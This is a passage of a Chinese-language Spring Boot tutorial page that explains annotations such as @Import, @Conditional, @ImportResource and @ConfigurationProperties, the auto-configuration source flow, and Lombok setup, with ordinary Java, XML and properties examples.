title="09、底层注解-@Import导入组件"></a>09、底层注解-@Import导入组件</h2><p>@Bean、@Component、@Controller、@Service、@Repository，它们是Spring的基本标签，在Spring Boot中并未改变它们原来的功能。</p><p>@ComponentScan 在<a href="#">07、基础入门-SpringBoot-自动配置特性</a>有用例。</p><p>@Import({User.class, DBHelper.class})给容器中<strong>自动创建出这两个类型的组件</strong>、默认组件的名字就是全类名</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Import(&#123;User.class, DBHelper.class&#125;)</span><br><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span> <span class="hljs-comment">//告诉SpringBoot这是一个配置类 == 配置文件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1、返回我们IOC容器</span><br><span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">//5、获取组件</span><br>String[] beanNamesForType = run.getBeanNamesForType(User.class);<br><br><span class="hljs-keyword">for</span> (String s : beanNamesForType) &#123;<br>    System.out.println(s);<br>&#125;<br><br><span class="hljs-type">DBHelper</span> <span class="hljs-variable">bean1</span> <span class="hljs-operator">=</span> run.getBean(DBHelper.class);<br>System.out.println(bean1);<br></code></pre></td></tr></table></figure><h2 id="10、底层注解-Conditional条件装配"><a href="#10、底层注解-Conditional条件装配" class="headerlink" title="10、底层注解-@Conditional条件装配"></a>10、底层注解-@Conditional条件装配</h2><p><strong>条件装配：满足Conditional指定的条件，则进行组件注入</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005453173.png" alt="在这里插入图片描述"></p><p>用@ConditionalOnMissingBean举例说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = &quot;tom&quot;)</span><span class="hljs-comment">//没有tom名字的Bean时，MyConfig类的Bean才能生效。</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> User <span class="hljs-title function_">user01</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">zhangsan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">18</span>);<br>        zhangsan.setPet(tomcatPet());<br>        <span class="hljs-keyword">return</span> zhangsan;<br>    &#125;<br><br>    <span class="hljs-meta">@Bean(&quot;tom22&quot;)</span><br>    <span class="hljs-keyword">public</span> Pet <span class="hljs-title function_">tomcatPet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pet</span>(<span class="hljs-string">&quot;tomcat&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1、返回我们IOC容器</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br>    <span class="hljs-comment">//2、查看容器里面的组件</span><br>    String[] names = run.getBeanDefinitionNames();<br>    <span class="hljs-keyword">for</span> (String name : names) &#123;<br>        System.out.println(name);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tom&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;容器中Tom组件：&quot;</span>+tom);<span class="hljs-comment">//false</span><br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">user01</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;user01&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;容器中user01组件：&quot;</span>+user01);<span class="hljs-comment">//true</span><br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">tom22</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;tom22&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;容器中tom22组件：&quot;</span>+tom22);<span class="hljs-comment">//true</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="11、底层注解-ImportResource导入Spring配置文件"><a href="#11、底层注解-ImportResource导入Spring配置文件" class="headerlink" title="11、底层注解-@ImportResource导入Spring配置文件"></a>11、底层注解-@ImportResource导入Spring配置文件</h2><p>比如，公司使用bean.xml文件生成配置bean，然而你为了省事，想继续复用bean.xml，@ImportResource粉墨登场。</p><p>bean.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">...</span>&quot;&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;haha&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lun.boot.bean.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zhangsan&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;18&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hehe&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.lun.boot.bean.Pet&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;tomcat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ImportResource(&quot;classpath:beans.xml&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//1、返回我们IOC容器</span><br>    <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> SpringApplication.run(MainApplication.class, args);<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">haha</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;haha&quot;</span>);<br><span class="hljs-type">boolean</span> <span class="hljs-variable">hehe</span> <span class="hljs-operator">=</span> run.containsBean(<span class="hljs-string">&quot;hehe&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;haha：&quot;</span>+haha);<span class="hljs-comment">//true</span><br>System.out.println(<span class="hljs-string">&quot;hehe：&quot;</span>+hehe);<span class="hljs-comment">//true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="12、底层注解-ConfigurationProperties配置绑定"><a href="#12、底层注解-ConfigurationProperties配置绑定" class="headerlink" title="12、底层注解-@ConfigurationProperties配置绑定"></a>12、底层注解-@ConfigurationProperties配置绑定</h2><p>如何使用Java读取到properties文件中的内容，并且把它封装到JavaBean中，以供随时使用</p><p>传统方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getProperties</span> &#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> FileNotFoundException, IOException &#123;<br>         <span class="hljs-type">Properties</span> <span class="hljs-variable">pps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>         pps.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.properties&quot;</span>));<br>         <span class="hljs-type">Enumeration</span> <span class="hljs-variable">enum1</span> <span class="hljs-operator">=</span> pps.propertyNames();<span class="hljs-comment">//得到配置文件的名字</span><br>         <span class="hljs-keyword">while</span>(enum1.hasMoreElements()) &#123;<br>             <span class="hljs-type">String</span> <span class="hljs-variable">strKey</span> <span class="hljs-operator">=</span> (String) enum1.nextElement();<br>             <span class="hljs-type">String</span> <span class="hljs-variable">strValue</span> <span class="hljs-operator">=</span> pps.getProperty(strKey);<br>             System.out.println(strKey + <span class="hljs-string">&quot;=&quot;</span> + strValue);<br>             <span class="hljs-comment">//封装到JavaBean。</span><br>         &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><hr><p>Spring Boot一种配置配置绑定：</p><p>@ConfigurationProperties + @Component</p><p>假设有配置文件application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">mycar.brand</span>=<span class="hljs-string">BYD</span><br><span class="hljs-attr">mycar.price</span>=<span class="hljs-string">100000</span><br></code></pre></td></tr></table></figure><p>只有在容器中的组件，才会拥有SpringBoot提供的强大功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mycar&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><hr><p>Spring Boot另一种配置配置绑定：</p><p>@EnableConfigurationProperties + @ConfigurationProperties</p><ol><li>开启Car配置绑定功能</li><li>把这个Car这个组件自动注册到容器中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableConfigurationProperties(Car.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mycar&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13、自动配置【源码分析】-自动包规则原理"><a href="#13、自动配置【源码分析】-自动包规则原理" class="headerlink" title="13、自动配置【源码分析】-自动包规则原理"></a>13、自动配置【源码分析】-自动包规则原理</h2><p>Spring Boot应用的启动类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        SpringApplication.run(MainApplication.class, args);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>分析下<code>@SpringBootApplication</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootApplication &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>重点分析<code>@SpringBootConfiguration</code>，<code>@EnableAutoConfiguration</code>，<code>@ComponentScan</code>。</p><h3 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootConfiguration &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@Configuration</code>代表当前是一个配置类。</p><h3 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h3><p>指定扫描哪些Spring注解。</p><p>@ComponentScan 在<a href="#">07、基础入门-SpringBoot-自动配置特性</a>有用例。</p><h3 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@AutoConfigurationPackage</span><br><span class="hljs-meta">@Import(AutoConfigurationImportSelector.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> EnableAutoConfiguration &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.boot.enableautoconfiguration&quot;</span>;<br><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点分析<code>@AutoConfigurationPackage</code>，<code>@Import(AutoConfigurationImportSelector.class)</code>。</p><h4 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h4><p>标签名直译为：自动配置包，指定了默认的包规则。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(ElementType.TYPE)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@Import(AutoConfigurationPackages.Registrar.class)</span><span class="hljs-comment">//给容器中导入一个组件</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> AutoConfigurationPackage &#123;<br>    String[] basePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    Class&lt;?&gt;[] basePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>利用Registrar给容器中导入一系列组件</li><li>将指定的一个包下的所有组件导入进MainApplication所在包下。</li></ol><h2 id="14、自动配置【源码分析】-初始加载自动配置类"><a href="#14、自动配置【源码分析】-初始加载自动配置类" class="headerlink" title="14、自动配置【源码分析】-初始加载自动配置类"></a>14、自动配置【源码分析】-初始加载自动配置类</h2><h4 id="Import-AutoConfigurationImportSelector-class"><a href="#Import-AutoConfigurationImportSelector-class" class="headerlink" title="@Import(AutoConfigurationImportSelector.class)"></a>@Import(AutoConfigurationImportSelector.class)</h4><ol><li>利用<code>getAutoConfigurationEntry(annotationMetadata);</code>给容器中批量导入一些组件</li><li>调用<code>List&lt;String&gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)</code>获取到所有需要导入到容器中的配置类</li><li>利用工厂加载 <code>Map&lt;String, List&lt;String&gt;&gt; loadSpringFactories(@Nullable ClassLoader classLoader);</code>得到所有的组件</li><li>从<code>META-INF/spring.factories</code>位置来加载一个文件。<ul><li>默认扫描我们当前系统里面所有<code>META-INF/spring.factories</code>位置的文件</li><li><code>spring-boot-autoconfigure-2.3.4.RELEASE.jar</code>包里面也有<code>META-INF/spring.factories</code></li></ul></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005536620.png" alt="在这里插入图片描述"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># 文件里面写死了spring-boot一启动就要给容器中加载的所有配置类</span><br><span class="hljs-comment"># spring-boot-autoconfigure-2.3.4.RELEASE.jar/META-INF/spring.factories</span><br><span class="hljs-comment"># Auto Configure</span><br><span class="hljs-attr">org.springframework.boot.autoconfigure.EnableAutoConfiguration</span>=<span class="hljs-string">\</span><br><span class="hljs-string">org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\</span><br><span class="hljs-string">org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>虽然我们127个场景的所有自动配置启动的时候默认全部加载，但是<code>xxxxAutoConfiguration</code>按照条件装配规则（<code>@Conditional</code>），最终会按需配置。</p><p>如<code>AopAutoConfiguration</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(</span><br><span class="hljs-meta">    proxyBeanMethods = false</span><br><span class="hljs-meta">)</span><br><span class="hljs-meta">@ConditionalOnProperty(</span><br><span class="hljs-meta">    prefix = &quot;spring.aop&quot;,</span><br><span class="hljs-meta">    name = &quot;auto&quot;,</span><br><span class="hljs-meta">    havingValue = &quot;true&quot;,</span><br><span class="hljs-meta">    matchIfMissing = true</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AopAutoConfiguration</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AopAutoConfiguration</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15、自动配置【源码分析】-自动配置流程"><a href="#15、自动配置【源码分析】-自动配置流程" class="headerlink" title="15、自动配置【源码分析】-自动配置流程"></a>15、自动配置【源码分析】-自动配置流程</h2><p>以<code>DispatcherServletAutoConfiguration</code>的内部类<code>DispatcherServletConfiguration</code>为例子:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnBean(MultipartResolver.class)</span>  <span class="hljs-comment">//容器中有这个类型组件</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = DispatcherServlet.MULTIPART_RESOLVER_BEAN_NAME)</span> <span class="hljs-comment">//容器中没有这个名字 multipartResolver 的组件</span><br><span class="hljs-keyword">public</span> MultipartResolver <span class="hljs-title function_">multipartResolver</span><span class="hljs-params">(MultipartResolver resolver)</span> &#123;<br><span class="hljs-comment">//给@Bean标注的方法传入了对象参数，这个参数的值就会从容器中找。</span><br><span class="hljs-comment">//SpringMVC multipartResolver。防止有些用户配置的文件上传解析器不符合规范</span><br><span class="hljs-comment">// Detect if the user has created a MultipartResolver but named it incorrectly</span><br><span class="hljs-keyword">return</span> resolver;<span class="hljs-comment">//给容器中加入了文件上传解析器；</span><br>&#125;<br></code></pre></td></tr></table></figure><p>SpringBoot默认会在底层配好所有的组件，但是<strong>如果用户自己配置了以用户的优先</strong>。</p><p><strong>总结</strong>：</p><ul><li>SpringBoot先加载所有的自动配置类  xxxxxAutoConfiguration</li><li>每个自动配置类按照条件进行生效，默认都会绑定配置文件指定的值。（xxxxProperties里面读取，xxxProperties和配置文件进行了绑定）</li><li>生效的配置类就会给容器中装配很多组件</li><li>只要容器中有这些组件，相当于这些功能就有了</li><li>定制化配置<ul><li>用户直接自己@Bean替换底层的组件</li><li>用户去看这个组件是获取的配置文件什么值就去修改。</li></ul></li></ul><p><strong>xxxxxAutoConfiguration —&gt; 组件 —&gt; xxxxProperties里面拿值  —-&gt; application.properties</strong></p><h2 id="16、最佳实践-SpringBoot应用如何编写"><a href="#16、最佳实践-SpringBoot应用如何编写" class="headerlink" title="16、最佳实践-SpringBoot应用如何编写"></a>16、最佳实践-SpringBoot应用如何编写</h2><ul><li>引入场景依赖<ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-spring-boot.html#using-boot-starter">官方文档</a></li></ul></li><li>查看自动配置了哪些（选做）<ul><li>自己分析，引入场景对应的自动配置一般都生效了</li><li>配置文件中debug&#x3D;true开启自动配置报告。<ul><li>Negative（不生效）</li><li>Positive（生效）</li></ul></li></ul></li><li>是否需要修改<ul><li>参照文档修改配置项<ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/appendix-application-properties.html#common-application-properties">官方文档</a></li><li>自己分析。xxxxProperties绑定了配置文件的哪些。</li></ul></li><li>自定义加入或者替换组件<ul><li>@Bean、@Component…</li></ul></li><li>自定义器  XXXXXCustomizer；</li><li>……</li></ul></li></ul><h2 id="17、最佳实践-Lombok简化开发"><a href="#17、最佳实践-Lombok简化开发" class="headerlink" title="17、最佳实践-Lombok简化开发"></a>17、最佳实践-Lombok简化开发</h2><p>Lombok用标签方式代替构造器、getter&#x2F;setter、toString()等鸡肋代码。</p><p>spring boot已经管理Lombok。引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>IDEA中File-&gt;Settings-&gt;Plugins，搜索安装Lombok插件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@NoArgsConstructor</span><br><span 